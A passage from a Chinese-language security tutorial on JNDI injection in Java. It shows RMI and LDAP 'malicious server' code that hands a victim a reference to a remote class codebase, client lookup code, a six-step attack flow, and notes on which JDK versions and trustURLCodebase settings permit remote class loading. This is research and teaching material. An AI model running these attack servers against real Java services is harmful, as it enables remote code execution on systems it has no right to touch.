    import javax.naming.Reference;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class RMIServer1 {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            // 创建Registry
            Registry registry = LocateRegistry.createRegistry(9999);
            System.out.println("java RMI registry created. port on 9999...");
            Reference refObj = new Reference("ExportObject", "com.longofo.remoteclass.ExportObject", "http://127.0.0.1:8000/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
            registry.bind("refObj", refObjWrapper);
        }
    }
客户端，
    package com.longofo.jndi;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    public class RMIClient1 {
        public static void main(String[] args) throws RemoteException, NotBoundException, NamingException {
    //        Properties env = new Properties();
    //        env.put(Context.INITIAL_CONTEXT_FACTORY,
    //                "com.sun.jndi.rmi.registry.RegistryContextFactory");
    //        env.put(Context.PROVIDER_URL,
    //                "rmi://localhost:9999");
            Context ctx = new InitialContext();
            ctx.lookup("rmi://localhost:9999/refObj");
        }
    }
完整代码在[github](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)上，先启动`remote-class/src/main/java/com/longofo/remoteclass/HttpServer`，接着启动`rmi-jndi-ldap-jrmp/jndi/src/main/java/com/longofo/jndi/RMIServer1`，在运行`rmi-jndi-ldap-jrmp/jndi/src/main/java/com/longofo/jndi/RMIClient1`即可复现，在JDK 1.8.0_102测试通过。
还有一种利用本地Class作为Reference
Factory，这样可以在更高的版本使用，可以参考[11]的"绕过高版本JDK限制：利用本地Class作为Reference Factory"相关部分。
##### JNDI+LDAP攻击向量
###### LDAP简介
LDAP（Lightweight Directory Access Protocol
，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。
**目录树概念**
  * 目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目
  * 条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）
  * 对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来
  * 属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。如javaCodeBase、objectClass、javaFactory、javaSerializedData、javaRemoteLocation等属性，在后面的利用中会用到这些属性
**DC、UID、OU、CN、SN、DN、RDN（互联网命名组织架构使用的这些关键字，还有其他的架构有不同的属关键字）**
**关键字** | **英文全称** | **含义**  
---|---|---  
**dc** | Domain Component |
域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com（一条记录的所属位置）  
**uid** | User Id | 用户ID songtao.xu（一条记录的ID）  
**ou** | Organization Unit |
组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如"employees"（一条记录的所属组织单位）  
**cn** | Common Name | 公共名称，如"Thomas Johansson"（一条记录的名称）  
**sn** | Surname | 姓，如"xu"  
**dn** | Distinguished Name |
由有多个其他属性组成，如"uid=songtao.xu,ou=oa组,dc=example,dc=com"，一条记录的位置（唯一）  
**rdn** | Relative dn | 相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid=tom”或“cn=
Thomas Johansson”  
LDAP
的目录信息是以树形结构进行存储的，在树根一般定义国家（c=CN）或者域名（dc=com），其次往往定义一个或多个组织（organization，o）或组织单元（organization
unit，ou）。一个组织单元可以包含员工、设备信息（计算机/打印机等）相关信息。例如为公司的员工设置一个DN，可以基于cn或uid（User
ID）作为用户账号。如example.com的employees单位员工longofo的DN可以设置为下面这样：
uid=longofo,ou=employees,dc=example,dc=com
用树形结构表示就是下面这种形式（Person绑定的是类对象）：
###### LDAP攻击向量
攻击过程如下：
  1. 攻击者为易受攻击的JNDI查找方法提供了一个绝对的LDAP URL
  2. 服务器连接到由攻击者控制的LDAP服务器，该服务器返回恶意JNDI 引用
  3. 服务器解码JNDI引用
  4. 服务器从攻击者控制的服务器获取Factory类
  5. 服务器实例化Factory类
  6. 有效载荷得到执行
JNDI也可以用于与LDAP目录服务进行交互。通过使用几个特殊的Java属性，如上面提到的javaCodeBase、objectClass、javaFactory、javaSerializedData、javaRemoteLocation属性等，使用这些属性可以使用LDAP来存储Java对象，在LDAP目录中存储属性至少有以下几种方式：
  * 使用序列化
[12]
这种方式在具体在哪个版本开始需要开启`com.sun.jndi.ldap.object.trustURLCodebase`属性默认为true才允许远程加载类还不清楚，不过我在jdk1.8.0_102上测试需要设置这个属性为true。
恶意服务端：
      package com.longofo;
      import com.unboundid.ldap.listener.InMemoryDirectoryServer;
      import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
      import com.unboundid.ldap.listener.InMemoryListenerConfig;
      import javax.net.ServerSocketFactory;
      import javax.net.SocketFactory;
      import javax.net.ssl.SSLSocketFactory;
      import java.io.IOException;
      import java.net.InetAddress;
      /**
       * LDAP server implementation returning JNDI references
       *
       * @author mbechler
       */
      public class LDAPSeriServer {
          private static final String LDAP_BASE = "dc=example,dc=com";
          public static void main(String[] args) throws IOException {
              int port = 1389;
              try {
                  InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                  config.setListenerConfigs(new InMemoryListenerConfig(
                          "listen", //$NON-NLS-1$
                          InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                          port,
                          ServerSocketFactory.getDefault(),
                          SocketFactory.getDefault(),
                          (SSLSocketFactory) SSLSocketFactory.getDefault()));
                  config.setSchema(null);
                  config.setEnforceAttributeSyntaxCompliance(false);
                  config.setEnforceSingleStructuralObjectClass(false);
                  InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                  ds.add("dn: " + "dc=example,dc=com", "objectClass: top", "objectclass: domain");
                  ds.add("dn: " + "ou=employees,dc=example,dc=com", "objectClass: organizationalUnit", "objectClass: top");
                  ds.add("dn: " + "uid=longofo,ou=employees,dc=example,dc=com", "objectClass: ExportObject");
                  System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                  ds.startListening();
              } catch (Exception e) {
                  e.printStackTrace();
              }
          }
      }
客户端：
      package com.longofo.jndi;
      import javax.naming.Context;
      import javax.naming.InitialContext;
      import javax.naming.NamingException;
      public class LDAPClient1 {
          public static void main(String[] args) throws NamingException {
              System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
              Context ctx = new InitialContext();
              Object object =  ctx.lookup("ldap://127.0.0.1:1389/uid=longofo,ou=employees,dc=example,dc=com");
          }
      }
完整代码在[github](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)上，先启动`remote-class/src/main/java/com/longofo/remoteclass/HttpServer`，接着启动`rmi-jndi-ldap-jrmp/ldap/src/main/java/com/longofo/LDAPSeriServer`，运行`rmi-jndi-ldap-jrmp/ldap/src/main/java/com/longofo/LDAPServer1`添加codebase以及序列化对象，在运行客户端`rmi-jndi-ldap-jrmp/jndi/src/main/java/com/longofo/jndi/LDAPClient1`即可复现。以上代码在JDK
1.8.0_102测试通过，注意客户端`System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true")`这里我在jdk
1.8.0_102测试不添加这个允许远程加载是不行的，所以具体的测试结果还是以实际的测试为准。
  * 使用JNDI引用
[>](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html)[13]
这种方式在Oracle JDK 11.0.1、8u191、7u201、6u211之后
com.sun.jndi.ldap.object.trustURLCodebase属性默认为false时不允许远程加载类了
    恶意服务端：
      package com.longofo;
      import com.unboundid.ldap.listener.InMemoryDirectoryServer;
      import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
      import com.unboundid.ldap.listener.InMemoryListenerConfig;
      import javax.net.ServerSocketFactory;
      import javax.net.SocketFactory;
      import javax.net.ssl.SSLSocketFactory;
      import java.io.IOException;
      import java.net.InetAddress;
      /**
       * LDAP server implementation returning JNDI references
       *
       * @author mbechler
       */
      public class LDAPRefServer {
          private static final String LDAP_BASE = "dc=example,dc=com";
          public static void main(String[] args) throws IOException {
              int port = 1389;
              try {
                  InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                  config.setListenerConfigs(new InMemoryListenerConfig(
                          "listen", //$NON-NLS-1$
                          InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                          port,
                          ServerSocketFactory.getDefault(),
                          SocketFactory.getDefault(),
                          (SSLSocketFactory) SSLSocketFactory.getDefault()));
                  config.setSchema(null);